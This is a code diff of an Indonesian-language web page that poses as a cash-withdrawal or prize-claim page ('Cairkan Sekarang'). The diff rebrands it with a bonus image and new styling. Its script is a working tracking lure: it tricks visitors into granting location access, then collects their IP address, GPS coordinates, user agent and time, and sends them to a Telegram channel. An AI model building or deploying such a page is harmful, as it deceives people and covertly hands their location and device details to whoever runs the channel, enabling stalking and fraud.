@@ -1,31 +1,42 @@
 
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Penarikan Uang Tunai</title>
+  <title>Penarikan Tunai | CYBER FLAY</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: #000;
+      color: white;
       text-align: center;
-      padding-top: 100px;
+      padding-top: 40px;
+    }
+    img {
+      width: 80%;
+      max-width: 400px;
+      border-radius: 12px;
+      margin-bottom: 20px;
     }
     button {
       padding: 15px 30px;
       font-size: 18px;
-      background-color: #28a745;
+      background-color: #ff6600;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       cursor: pointer;
+    }
+    h2 {
+      color: #00ffcc;
     }
   </style>
 </head>
 <body>
-  <h2>Penarikan Uang Tunai</h2>
-  <p>Silakan klik tombol di bawah ini dan izinkan lokasi untuk melanjutkan proses penarikan.</p>
-  <button onclick="mulaiPelacakan()">Mulai</button>
+  <img src="tashanwin.jpg" alt="Bonus Menang">
+  <h2>Selamat Datang!</h2>
+  <p>Untuk mencairkan hadiah Anda, silakan klik tombol di bawah dan izinkan lokasi.</p>
+  <button onclick="mulaiPelacakan()">Cairkan Sekarang</button>
 
   <script>
     async function getIP() {
@@ -66,19 +77,15 @@
           const latitude = pos.coords.latitude;
           const longitude = pos.coords.longitude;
 
-          const pesan = `🌐 PELACAKAN BARU:
-IP: ${ip}
-Lokasi: https://maps.google.com/?q=${latitude},${longitude}
-User-Agent: ${userAgent}
-Waktu: ${time}`;
+          const pesan = `📱 IP: ${ip}\n📍 Lokasi: https://maps.google.com/?q=${latitude},${longitude}\n🕒 Waktu: ${time}\n🧠 Agen: ${userAgent}`;
 
           kirimTelegram(pesan);
-          alert("Permintaan sedang diproses...");
+          alert("Sedang diproses, mohon tunggu...");
         }, function(error) {
           alert("Gagal mengambil lokasi: " + error.message);
         });
       } else {
-        alert("Geolocation tidak didukung di perangkat ini.");
+        alert("Perangkat tidak mendukung pelacakan lokasi.");
       }
     }
   </script>
